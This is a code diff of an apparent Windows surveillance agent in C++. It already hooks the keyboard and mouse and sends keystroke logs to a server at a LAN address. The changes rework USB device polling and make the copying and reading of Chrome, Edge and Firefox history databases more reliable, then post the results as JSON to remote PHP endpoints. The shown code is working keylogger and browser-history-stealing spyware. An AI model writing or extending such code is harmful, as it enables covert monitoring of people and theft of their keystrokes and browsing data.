@@ -26,6 +26,7 @@ typedef ULONG PROPID;
 #include <chrono>
 #include <map>
 #include <mutex>
+#include <set>
 #include <algorithm> // for std::replace
 #include <iomanip>   // for std::put_time
 #include <iphlpapi.h> // for GetAdaptersInfo
@@ -42,6 +43,27 @@ typedef ULONG PROPID;
 #endif
 #ifndef GUID_DEVINTERFACE_USB_DEVICE
 DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
+#endif
+
+// Additional USB device GUIDs for better monitoring
+#ifndef GUID_DEVINTERFACE_USB_HUB
+DEFINE_GUID(GUID_DEVINTERFACE_USB_HUB, 0xF359721BL, 0xA47B, 0x11D5, 0x9C, 0xE8, 0x00, 0x50, 0x56, 0xB8, 0x7F, 0x00);
+#endif
+
+#ifndef GUID_DEVINTERFACE_DISK
+DEFINE_GUID(GUID_DEVINTERFACE_DISK, 0x53F56307L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
+#endif
+
+#ifndef GUID_DEVINTERFACE_CDROM
+DEFINE_GUID(GUID_DEVINTERFACE_CDROM, 0x53F56308L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
+#endif
+
+#ifndef GUID_DEVINTERFACE_KEYBOARD
+DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD, 0x884b96c3L, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
+#endif
+
+#ifndef GUID_DEVINTERFACE_MOUSE
+DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, 0x378de44cL, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
 #endif
 
 // Device broadcast structures (if not defined in MinGW)
@@ -87,15 +109,18 @@ std::mutex dataMutex;
 HHOOK keyboardHook = NULL;
 HHOOK mouseHook = NULL;
 
+// Log file for debugging
+std::ofstream debugLogFile;
+
 // Configuration
 std::string API_BASE_URL = "http://192.168.1.45:8924";
 std::string API_ROUTE = "/webapi.php";
 std::string TIC_ROUTE = "/eventhandler.php";
 std::string APP_VERSION = "1.0";
 
-// Global variables for USB monitoring
-HWND usbWindow = NULL;
-HDEVNOTIFY usbNotification = NULL;
+// USB monitoring using WMI
+std::thread usbMonitoringThread;
+bool usbMonitoringActive = false;
 
 // Structure for browser history
 struct BrowserHistoryEntry {
@@ -143,77 +168,123 @@ std::string getChromeHistory();
 std::string getFirefoxHistory();
 std::string getEdgeHistory();
 void monitorTask();
+void writeDebugLog(const std::string& message);
 
-// USB monitoring window procedure
-LRESULT CALLBACK USBWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-    if (uMsg == WM_DEVICECHANGE) {
-        switch (wParam) {
-            case DBT_DEVICEARRIVAL:
-            case DBT_DEVICEREMOVECOMPLETE: {
-                DEV_BROADCAST_HDR* dbh = (DEV_BROADCAST_HDR*)lParam;
-                if (dbh->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
-                    DEV_BROADCAST_DEVICEINTERFACE* dbdi = (DEV_BROADCAST_DEVICEINTERFACE*)dbh;
-                    
-                    std::string devicePath = dbdi->dbcc_name;
-                    std::string action = (wParam == DBT_DEVICEARRIVAL) ? "Connected" : "Disconnected";
-                    std::string timestamp = getCurrentDateTimeString();
-                    
+// Setup USB monitoring
+void setupUSBMONITORING() {
+    writeDebugLog("Starting USB monitoring setup...");
+    
+    usbMonitoringActive = true;
+    usbMonitoringThread = std::thread([]() {
+        writeDebugLog("USB monitoring thread started");
+        
+        std::set<std::string> knownDevices;
+        int loopCount = 0;
+        
+        while (usbMonitoringActive) {
+            loopCount++;
+            writeDebugLog("USB monitoring loop iteration: " + std::to_string(loopCount));
+            
+            // Get current USB devices - enumerate all devices and filter for USB
+            std::set<std::string> currentDevices;
+            
+            // Enumerate all devices
+            HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
+            if (deviceInfoSet != INVALID_HANDLE_VALUE) {
+                writeDebugLog("USB devices info set created successfully");
+                
+                SP_DEVINFO_DATA deviceInfoData;
+                deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+                
+                DWORD deviceIndex = 0;
+                while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
+                    // Get device ID
+                    char deviceId[256] = {0};
+                    if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
+                        std::string deviceIdStr = deviceId;
+                        
+                        currentDevices.insert(deviceIdStr);
+                        writeDebugLog("Found USB device: " + deviceIdStr);
+                        
+                        // Check if this is a new device
+                        if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
+                            // New device connected
+                            std::string deviceName = "USB Device";
+                            
+                            // Try to get friendly name
+                            char friendlyName[256] = {0};
+                            if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)friendlyName, sizeof(friendlyName), NULL)) {
+                                deviceName = friendlyName;
+                            } else {
+                                char deviceDesc[256] = {0};
+                                if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_DEVICEDESC, NULL, (PBYTE)deviceDesc, sizeof(deviceDesc), NULL)) {
+                                    deviceName = deviceDesc;
+                                }
+                            }
+                            
+                            Json::Value usbLog;
+                            usbLog["date"] = getCurrentDateTimeString();
+                            usbLog["device_name"] = deviceName;
+                            usbLog["device_path"] = deviceIdStr;
+                            usbLog["device_type"] = "USB Device";
+                            usbLog["action"] = "Connected";
+                            
+                            writeDebugLog("USB Device Connected: " + deviceName + " (" + deviceIdStr + ")");
+                            
+                            std::lock_guard<std::mutex> lock(dataMutex);
+                            usbDeviceLogs.push_back(usbLog);
+                        }
+                    }
+                    deviceIndex++;
+                }
+                
+                writeDebugLog("Total USB devices found: " + std::to_string(currentDevices.size()));
+                SetupDiDestroyDeviceInfoList(deviceInfoSet);
+            } else {
+                writeDebugLog("Failed to create device info set. Error: " + std::to_string(GetLastError()));
+            }
+            
+            // Check for disconnected devices
+            for (const auto& device : knownDevices) {
+                if (currentDevices.find(device) == currentDevices.end()) {
+                    // Device disconnected
                     Json::Value usbLog;
-                    usbLog["date"] = timestamp;
-                    usbLog["device"] = devicePath;
-                    usbLog["action"] = action;
+                    usbLog["date"] = getCurrentDateTimeString();
+                    usbLog["device_name"] = "USB Device";
+                    usbLog["device_path"] = device;
+                    usbLog["device_type"] = "USB Device";
+                    usbLog["action"] = "Disconnected";
+                    
+                    writeDebugLog("USB Device Disconnected: " + device);
                     
                     std::lock_guard<std::mutex> lock(dataMutex);
                     usbDeviceLogs.push_back(usbLog);
                 }
-                break;
             }
+            
+            knownDevices = currentDevices;
+            
+            // Sleep for 2 seconds before next check
+            std::this_thread::sleep_for(std::chrono::seconds(2));
         }
-    }
-    return DefWindowProc(hwnd, uMsg, wParam, lParam);
-}
-
-// Setup USB monitoring
-void setupUSBMONITORING() {
-    // Register window class for USB monitoring
-    WNDCLASSA wc = {};
-    wc.lpfnWndProc = USBWindowProc;
-    wc.hInstance = GetModuleHandle(NULL);
-    wc.lpszClassName = "USBMonitorWindow";
-    RegisterClassA(&wc);
-    
-    // Create hidden window to receive device notifications
-    usbWindow = CreateWindowA("USBMonitorWindow", "USB Monitor", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);
-    
-    if (usbWindow) {
-        // Register for USB device notifications
-        DEV_BROADCAST_DEVICEINTERFACE notificationFilter;
-        ZeroMemory(&notificationFilter, sizeof(notificationFilter));
-        notificationFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
-        notificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
-        notificationFilter.dbcc_classguid = GUID_DEVINTERFACE_USB_DEVICE;
         
-        usbNotification = RegisterDeviceNotification(usbWindow, &notificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);
-        
-        if (!usbNotification) {
-            std::cerr << "Failed to register USB device notification" << std::endl;
-        }
-    } else {
-        std::cerr << "Failed to create USB monitoring window" << std::endl;
-    }
+        writeDebugLog("USB monitoring thread stopped");
+    });
+    
+    writeDebugLog("USB monitoring setup completed");
 }
 
 // Cleanup USB monitoring
 void cleanupUSBMONITORING() {
-    if (usbNotification) {
-        UnregisterDeviceNotification(usbNotification);
-        usbNotification = NULL;
+    writeDebugLog("Cleaning up USB monitoring...");
+    
+    usbMonitoringActive = false;
+    
+    if (usbMonitoringThread.joinable()) {
+        usbMonitoringThread.join();
     }
     
-    if (usbWindow) {
-        DestroyWindow(usbWindow);
-        usbWindow = NULL;
-    }
+    writeDebugLog("USB monitoring cleanup completed");
 }
 
 // Get MAC address
@@ -498,6 +569,11 @@ bool sendKeyLogs() {
 bool sendUSBLogs() {
     if (usbDeviceLogs.empty()) return true;
     
+    std::cout << "Sending " << usbDeviceLogs.size() << " USB logs" << std::endl;
+    
+    // Write to log file
+    writeDebugLog("Sending " + std::to_string(usbDeviceLogs.size()) + " USB logs to server");
+    
     std::string url = API_BASE_URL + TIC_ROUTE;
     
     Json::Value data;
@@ -513,7 +589,11 @@ bool sendUSBLogs() {
     Json::FastWriter writer;
     std::string jsonData = writer.write(data);
     
+    std::cout << "USB Log JSON: " << jsonData << std::endl;
+    
     std::string response = httpPost(url, jsonData);
+    
+    std::cout << "USB Log Response: " << response << std::endl;
     
     Json::Value root;
     Json::Reader reader;
@@ -772,8 +852,15 @@ std::string getChromeHistory() {
     std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
 #endif
     
+    // Create a temporary copy of the database to avoid locking issues
+    std::string tempPath = "temp_chrome_history.db";
+    if (!CopyFileA(chromePath.c_str(), tempPath.c_str(), FALSE)) {
+        // If copy fails, try to access the original
+        tempPath = chromePath;
+    }
+    
     sqlite3* db;
-    if (sqlite3_open(chromePath.c_str(), &db) != SQLITE_OK) {
+    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
         return "";
     }
     
@@ -785,15 +872,25 @@ std::string getChromeHistory() {
     if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             Json::Value entry;
-            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
-            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
-            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
-            historyArray.append(entry);
+            const char* url = (char*)sqlite3_column_text(stmt, 0);
+            const char* title = (char*)sqlite3_column_text(stmt, 1);
+            
+            if (url && title) {
+                entry["url"] = url;
+                entry["title"] = title;
+                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
+                historyArray.append(entry);
+            }
         }
         sqlite3_finalize(stmt);
     }
     
     sqlite3_close(db);
+    
+    // Clean up temporary file
+    if (tempPath != chromePath) {
+        DeleteFileA(tempPath.c_str());
+    }
     
     Json::FastWriter writer;
     return writer.write(historyArray);
@@ -814,16 +911,45 @@ std::string getFirefoxHistory() {
     std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
 #endif
     
-    // Find default profile
+    // Find all profiles, prefer default profile
+    std::string profilePath;
     WIN32_FIND_DATAA findData;
     HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
-    if (hFind == INVALID_HANDLE_VALUE) return "";
     
-    std::string profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
-    FindClose(hFind);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        // Found default profile
+        profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
+        FindClose(hFind);
+    } else {
+        // Try to find any profile
+        hFind = FindFirstFileA((firefoxPath + "\\*").c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    std::string testPath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
+                    if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                        profilePath = testPath;
+                        break;
+                    }
+                }
+            } while (FindNextFileA(hFind, &findData));
+            FindClose(hFind);
+        }
+    }
+    
+    if (profilePath.empty()) {
+        return "";
+    }
+    
+    // Create a temporary copy of the database to avoid locking issues
+    std::string tempPath = "temp_firefox_history.db";
+    if (!CopyFileA(profilePath.c_str(), tempPath.c_str(), FALSE)) {
+        // If copy fails, try to access the original
+        tempPath = profilePath;
+    }
     
     sqlite3* db;
-    if (sqlite3_open(profilePath.c_str(), &db) != SQLITE_OK) {
+    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
         return "";
     }
     
@@ -835,15 +961,25 @@ std::string getFirefoxHistory() {
     if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             Json::Value entry;
-            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
-            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
-            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
-            historyArray.append(entry);
+            const char* url = (char*)sqlite3_column_text(stmt, 0);
+            const char* title = (char*)sqlite3_column_text(stmt, 1);
+            
+            if (url && title) {
+                entry["url"] = url;
+                entry["title"] = title;
+                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
+                historyArray.append(entry);
+            }
         }
         sqlite3_finalize(stmt);
     }
     
     sqlite3_close(db);
+    
+    // Clean up temporary file
+    if (tempPath != profilePath) {
+        DeleteFileA(tempPath.c_str());
+    }
     
     Json::FastWriter writer;
     return writer.write(historyArray);
@@ -864,8 +1000,15 @@ std::string getEdgeHistory() {
     std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
 #endif
     
+    // Create a temporary copy of the database to avoid locking issues
+    std::string tempPath = "temp_edge_history.db";
+    if (!CopyFileA(edgePath.c_str(), tempPath.c_str(), FALSE)) {
+        // If copy fails, try to access the original
+        tempPath = edgePath;
+    }
+    
     sqlite3* db;
-    if (sqlite3_open(edgePath.c_str(), &db) != SQLITE_OK) {
+    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
         return "";
     }
     
@@ -877,15 +1020,25 @@ std::string getEdgeHistory() {
     if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             Json::Value entry;
-            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
-            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
-            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
-            historyArray.append(entry);
+            const char* url = (char*)sqlite3_column_text(stmt, 0);
+            const char* title = (char*)sqlite3_column_text(stmt, 1);
+            
+            if (url && title) {
+                entry["url"] = url;
+                entry["title"] = title;
+                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
+                historyArray.append(entry);
+            }
         }
         sqlite3_finalize(stmt);
     }
     
     sqlite3_close(db);
+    
+    // Clean up temporary file
+    if (tempPath != edgePath) {
+        DeleteFileA(tempPath.c_str());
+    }
     
     Json::FastWriter writer;
     return writer.write(historyArray);
@@ -966,9 +1119,11 @@ int main() {
     
     // Setup USB monitoring
     setupUSBMONITORING();
+    writeDebugLog("USB monitoring setup completed");
     
     // Start monitoring thread
     std::thread monitorThread(monitorTask);
+    writeDebugLog("Monitoring thread started");
     
     // Message loop
     MSG msg;
@@ -985,4 +1140,14 @@ int main() {
     CoUninitialize();
     
     return 0;
+}
+
+// Write debug log to file
+void writeDebugLog(const std::string& message) {
+    std::ofstream logFile("monitor_debug.log", std::ios::app);
+    if (logFile.is_open()) {
+        std::string timestamp = getCurrentDateTimeString();
+        logFile << "[" << timestamp << "] " << message << std::endl;
+        logFile.close();
+    }
 } 
